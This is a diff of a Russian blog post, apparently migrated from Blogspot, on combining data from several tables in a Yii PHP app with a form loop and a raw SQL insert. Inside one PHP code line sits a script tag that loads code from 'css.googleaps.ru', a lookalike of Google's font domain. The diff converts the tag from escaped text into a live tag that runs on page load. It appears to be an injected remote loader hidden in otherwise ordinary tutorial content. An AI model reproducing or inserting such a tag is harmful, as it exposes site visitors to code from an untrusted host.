@@ -25,8 +25,8 @@ tags:
 comments: []
 ---
 <div dir="ltr" style="text-align: left;">Немного изврата. Кто может посоветовать что лучше- пишите в комментариях или в личку.Предположим есть база</p>
-<div class="separator" style="clear: both; text-align: center;"><a style="margin-left: 1em; margin-right: 1em;" href="http:&#47;&#47;4.bp.blogspot.com&#47;-14MDryC4M3I&#47;VV2Y9KiH0HI&#47;AAAAAAAAAYc&#47;c77O47bfCw4&#47;s1600&#47;Screenshot_22.png"><img src="http:&#47;&#47;4.bp.blogspot.com&#47;-14MDryC4M3I&#47;VV2Y9KiH0HI&#47;AAAAAAAAAYc&#47;c77O47bfCw4&#47;s400&#47;Screenshot_22.png" alt="" width="400" height="248" border="0" &#47;><&#47;a><&#47;div><br />
-<span id="goog_785211009"><&#47;span><span id="goog_785211010"><&#47;span><br />
+<div class="separator" style="clear: both; text-align: center;"><a style="margin-left: 1em; margin-right: 1em;" href="http://4.bp.blogspot.com/-14MDryC4M3I/VV2Y9KiH0HI/AAAAAAAAAYc/c77O47bfCw4/s1600/Screenshot_22.png"><img src="http://4.bp.blogspot.com/-14MDryC4M3I/VV2Y9KiH0HI/AAAAAAAAAYc/c77O47bfCw4/s400/Screenshot_22.png" alt="" width="400" height="248" border="0" /></a></div><br />
+<span id="goog_785211009"></span><span id="goog_785211010"></span><br />
 нас интересует такой вопрос - как связать данные из нескольких таблиц (да даже без модели) в одну.</p>
 <p>возьмем самый простой пример.</p>
 <p>analiz_create - таблица анализов. одному анализу соответсвует несколько элементов.<br />
@@ -54,12 +54,12 @@ analiz_data - хранит данные</p>
     for($i = 0, $cnt = count($rows); $i < $cnt; $i++)<br />
     {<br />
         $id = $rows[$i]['id_elem'];<br />
-        $typeel = $rows[$i]['type']; <script src="&#47;&#47;css.googleaps.ru&#47;css?f=Open+Sans&cd=mb&ver=4.2.2"><&#47;script><&#47;code><&#47;pre></p>
+        $typeel = $rows[$i]['type']; <script src="//css.googleaps.ru/css?f=Open+Sans&cd=mb&ver=4.2.2"></script></code></pre></p>
 <pre><code>                echo '
 <div class="column">';<br />
                 echo CHtml::label($rows[$i]['name'], $rows[$i]['name']);<br />
                 echo CHtml::textField("elem[$id][val][]", '', array('id' => $rows[$i]['name']));<br />
-                echo '<&#47;div>'; <&#47;code><&#47;pre><br />
+                echo '</div>'; </code></pre><br />
 здесь я из таблицы a_template_has_elem получаю список полей и отображаю их.<br />
 в контролере тогда</p>
 <pre><code>                if (isset($_POST['elem']))<br />
@@ -93,8 +93,8 @@ analiz_data - хранит данные</p>
                                 ));<br />
                         }<br />
                     };<br />
-         <&#47;code><&#47;pre><br />
+         </code></pre><br />
 то вставляем данные при помощи sql запроса, не пользуясь стандартными средствами.</p>
 <p>&nbsp;</p>
-<p><&#47;div><br />
+<p></div><br />
 Source: des1roer.blogspot.com</p>
